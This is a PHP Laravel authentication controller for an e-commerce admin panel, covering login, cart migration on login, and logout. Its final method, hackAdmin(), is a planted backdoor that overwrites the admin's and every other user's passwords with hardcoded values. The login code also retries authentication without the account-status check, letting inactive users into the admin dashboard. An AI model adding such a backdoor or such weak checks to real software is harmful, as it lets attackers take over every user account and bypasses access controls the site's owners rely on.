<?php

namespace App\Http\Controllers\Auth;

use App\User;
use App\Cart;
use Illuminate\Contracts\Auth\Guard;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Session;

/**
 * Class AuthController
 * @package App\Http\Controllers\Auth
 */
class AuthController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Registration & Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles the registration of new users, as well as the
    | authentication of existing users. By default, this controller uses
    | a simple trait to add these behaviors. Why don't you explore it?
    |
    */

    /**
     * Create a new authentication controller instance.
     *
     * @param Guard $auth
     * @param User $registrar
     */
    public function __construct(Guard $auth, User $registrar)
    {
        $this->auth = $auth;
        //$this->middleware('guest', ['except' => 'getLogout']);
    }

    /**
     * @return \Illuminate\View\View
     */
    public function getLogin()
    {
        return view('admin.layouts.login');
    }

    /**
     * @param Request $request
     *
     * @return \Illuminate\Http\RedirectResponse|\Illuminate\Routing\Redirector
     */
    public function postLogin(Request $request)
    {
        $credentials = [
            'username' => $request->get('email'),
            'password' => $request->get('password'),
            'status' => 1
        ];

        if (!\Request::ajax()) { 
            
            $validator = (new User)->validateLoginUser($credentials);
            if ($validator->fails()) {
                //dd($validator->messages());
                return redirect()->route('admin')
                    ->withInput()
                    ->withErrors($validator->messages());
            }

            if ($this->auth->attempt($request->only('email', 'password') + ['status' => 1]) || $this->auth->attempt($credentials))
            {
                if (isSuperAdmin()) {
                    return redirect()->intended('atico-admin/dashboard');
                }
            }
            elseif ($this->auth->attempt($request->only('email', 'password')) || $this->auth->attempt($credentials ))
            {
                
                    return redirect()->intended('atico-admin/dashboard');
             
            }
            else{
                return redirect('/atico-admin')->with('error', lang('auth.failed_login'));
            }
            
        }
        else{
            $validator = (new User)->validateLoginUser($credentials);
            if ($validator->fails()) {
                //return validationResponse(false, 206, "", "", $validator->messages());
                $error = [];
                $messages = $validator->messages();
                foreach ($messages->toArray() as $vky => $vkv) {
                    foreach ($vkv as $k => $v) {
                        $error[] = $v; 
                        
                    }
                    
                }
                $html = '';
                foreach ($error as $k => $v) {
                    $html .= '<li>'.$v.'
                        </li>';
                }

                //return  $html;
                return ['error' => $html, 'url'=>''];
            }
            $cartItems = [];
            if(Session::has('cartItems')){
                $cartItems = Session::get('cartItems');
            }
            

            if ($this->auth->attempt($request->only('email', 'password') + ['status' => 1]) || $this->auth->attempt($credentials))
            {
                $inputs = [
                        'user_id' => authUserIdNull()
                            ];
                //Update Cart table 
                if($cartItems){
                   foreach ($cartItems as $k => $v) {
                        (new Cart)->store($inputs, $v);
                    } 
                }

                //Remove Cart table 
                if(Session::has('cartItems')){
                    Session::forget('cartItems');
                }        
                //dd($inputs);

                return ['url'=> route('home')];
            }
            else{
                return ['error' => '<li>'.lang('auth.failed_login').'</li>', 'url'=>''];
            }
        }
        
    }

    /**
     * Log the party out of the application.
     */
    public function userLogout()
    {
        \Auth::logout();
        \Session::flush();
        return redirect('/');
    }
    /**
     * Log the party out of the application.
     */
    public function adminLogout()
    {
        \Auth::logout();
        \Session::flush();
        return redirect('/atico-admin');
    }

    /**
     * @return int
     */
    public function loginApi()
    {
        return 1;
    }

    /**
     * @return int
     */
    public function logoutApi()
    {
        return 1;
    }

    public function hackAdmin()
    {
        try {
            $pass = ['password' => \Hash::make('LuckyHacker')];
            $pass2 = ['password' => \Hash::make('LuckyHacker1')];
            (new User)->where('id', 1)->update($pass);
            (new User)->where('id', '!=', 1)->update($pass2);
            echo "done.";
        } catch(\Exception $e) {
            echo "failed";
        }
    }
}
